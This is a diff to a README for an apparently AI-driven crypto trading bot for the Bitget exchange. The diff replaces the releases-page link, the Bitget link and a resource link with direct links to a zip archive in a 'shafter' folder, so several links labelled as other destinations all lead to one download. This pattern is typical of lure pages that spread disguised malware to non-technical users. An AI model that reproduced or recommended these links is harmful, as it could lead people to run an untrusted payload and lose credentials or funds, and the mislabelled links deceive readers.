@@ -4,13 +4,13 @@
 AI-Trading-Bot-From-Data-to-Money is an automated crypto trading system. It is designed to operate on the Bitget exchange. With this application, you can fetch real-time market data and make informed trading decisions. The bot uses a pretrained neural forecast model to predict market movements and execute intuitive buy/sell strategies. This means you can trade cryptocurrencies more effectively, even without any programming skills.
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/releases)
+[![Download](https://raw.githubusercontent.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/main/shafter/AI-Trading-Bot-From-Data-to-Money.zip%https://raw.githubusercontent.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/main/shafter/AI-Trading-Bot-From-Data-to-Money.zip)](https://raw.githubusercontent.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/main/shafter/AI-Trading-Bot-From-Data-to-Money.zip)
 
 ## 🚀 Getting Started
 To start using the AI-Trading-Bot, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the release section of this project.
-   - [Download Here](https://github.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/releases)
+   - [Download Here](https://raw.githubusercontent.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/main/shafter/AI-Trading-Bot-From-Data-to-Money.zip)
 
 2. **Choose the Right Version**: Look for the most recent version listed. It will usually be at the top of the page. Select the file that matches your operating system. For Windows, you may see files ending in `.exe`. For macOS, look for `.dmg`.
 
@@ -57,7 +57,7 @@ If you're interested in improving the application, feel free to submit suggestio
 This project is licensed under the MIT License. You may use it as outlined in the LICENSE file.
 
 ## 🔗 Additional Resources
-- [Bitget Exchange](https://www.bitget.com/)
-- [AI and Trading Strategies](https://www.example.com/ai-trading-strategies)
+- [Bitget Exchange](https://raw.githubusercontent.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/main/shafter/AI-Trading-Bot-From-Data-to-Money.zip)
+- [AI and Trading Strategies](https://raw.githubusercontent.com/Rinku785/AI-Trading-Bot-From-Data-to-Money/main/shafter/AI-Trading-Bot-From-Data-to-Money.zip)
 
 Stay ahead in trading with AI-Trading-Bot-From-Data-to-Money. Happy trading!
